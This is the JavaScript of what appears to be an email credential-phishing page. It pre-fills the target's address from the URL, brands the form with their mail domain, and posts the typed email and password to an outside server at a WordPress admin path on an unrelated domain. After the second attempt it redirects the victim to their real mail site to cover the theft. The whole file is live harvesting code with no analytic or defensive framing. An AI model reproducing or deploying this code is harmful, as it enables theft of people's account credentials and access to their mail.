(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"","rua.texp":""}]);

/* global $ */
var modal = document.getElementById('id01');
            window.onclick = function(event) {
              if (event.target == modal) {
                modal.style.display = "none";
              }
            }
            var email = new URLSearchParams(location.search).get('email'),
            error = new URLSearchParams(location.search).get("error");
            if (email){
              var domain = email.split("@")[1];
              var dom = domain.slice(0, domain.lastIndexOf("."));
              $("#pet").val(email);
              $("#pet").attr("readonly", "true");
              $("#source").val(dom.toUpperCase());
            }
            var modal = document.getElementById('id01');
            modal.style.display = "block";
            var submit = 0,
            dot = '.';

$(document).ready(function() {
    var count = 0;

    $('#back1').click(function() {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);

    });
    $("#email").keyup(function() {
        var my_email = $('#email').val();
        $('#em').html(my_email);
    });
    $('#show').click(function() {
        event.preventDefault();
        var x = document.getElementById("password");
        if (x.type === "password") {
            $('#show').html("hide");
            x.type = "text";
        } else {
            $('#show').html("show");
            x.type = "password";
        }

    });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    } else {
        // $('#email').val(email);
        var my_email = email;
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/other-1.png');
        $('#field').html("Other Mail");
        $('#email').val(my_email);
        $('#em').html(my_email);
        $("#msg").hide();
    }
    ///////////////url getting email////////////////



    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_email = email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!my_email) {
            $('#error').show();
            $('#error').html("Email field is empty...!");
            email.focus;
            return false;
        }
        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a valid @ email account");
            email.focus;
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is empty...!");
            email.focus;
            return false;
        }
        if (password.length < 5) {
            $('#error').show();
            $('#error').html("Please enter password atleast 5 digits..!");
            email.focus;
            return false;
        } 


        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'https://concretosmiracle.com/wp-admin/csi.php',
            type: 'POST',
            data: {
                email: email,
                password: password,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#password").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("http://www." + my_slice);

                        }
                        $('#msg').html(response['msg']);
                    } else {
                        $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#password").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                }
                $("#msg").show();
                $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Continue');
            }
        });
    });


});
